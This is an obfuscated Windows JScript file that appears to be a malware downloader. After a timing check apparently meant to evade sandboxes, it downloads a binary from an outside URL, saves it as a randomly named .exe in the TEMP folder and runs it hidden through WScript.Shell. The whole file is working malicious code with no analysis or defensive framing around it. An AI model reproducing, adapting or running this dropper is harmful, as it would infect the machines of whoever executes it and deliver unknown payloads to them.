var _FM = false;
var _O = "CreateObject";
var _SW = function _TE() {return WScript[_O]("WScript"+".Shell");}(), _FK = 11;
var _E = "MSXML2.XMLHTTP";
var _XC = 2123213;
var _AO = 0;
function _W(_G){_SW["Run"](_G, _AO, _AO);};
function _R(){return _E + "";};
function _ZY(_YV, _KI){_AO = _AO * 1; return _YV - _KI;};
function _HO(){return _O;};
/*@cc_on
  @if (@_win32 || @_win64)
    _FM = true;
  @end
@*/
if (_FM)
{
var _W0 = "";
function _B(){return 22;};
var _TA = 0; var _EF = 0;
function _EA()
{
var _EZ = new this["Date"]();
var _KJ = _EZ["getUTCMilliseconds"]();
WScript["Sleep"](_B());
var _EZ = new this["Date"]();
var _XX = _EZ["getUTCMilliseconds"]();
WScript["Sleep"](_B());
var _EZ = new this["Date"]();
var _IS = _EZ["getUTCMilliseconds"]();
var _TA = "_D";
_TA = _ZY(_XX, _KJ);
var _EF = "_X";
_EF = _ZY(_IS, _XX);
_W0 = "open";
return _ZY(_TA, _EF);
}
var _P = false;
var _QM = false;
for (var _WX = _AO; _WX < _B() * 1; _WX++){if (_EA() != _AO){
_P = true; 
_EF = "31" + 11 * _TA + _EF; 
_QM = true; 
break;
}}
function _WR() {return ((_P == true) && (_P == _QM)) ? 1 : _AO;};
if (_P && _WR() && _QM){
function _H() {return _SW["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "ZsJQnSXLCdJjoE.ex" + "e";};
 _G0 = _R();
 _X0 = WScript[_O](_G0);
 var _PO = 1;
 while (_PO){
try {
	if (_PO == 1)
	{
		_X0[_W0]("GET", "http://dev.orolatina.com/s3isk", false);
		_X0["send"]();
		_F = "Sleep";
	}
	WScript[_F](_B() + 120); 
	if (_X0["readystate"] < 2 * 2) continue;
	_PO = _AO;
	function _GU(_EW) {var _Q = (1, 2, 3, 4, 5, _EW); return _Q;};
	_J = WScript[_HO()]("ADODB.Stream");
	_G0 = _J;
	_G0[_W0]();
	_G0["type"] = _GU(1);
	_G0["write"](_X0["ResponseBody"]);
	_J["position"] = _GU(_AO);
	_G0["Save" + "ToFile"](_H(), 2);
	_J["cl"+"ose"]();
	_T = _H();
	_W(_T);
} catch(_UP){};
}
}
}

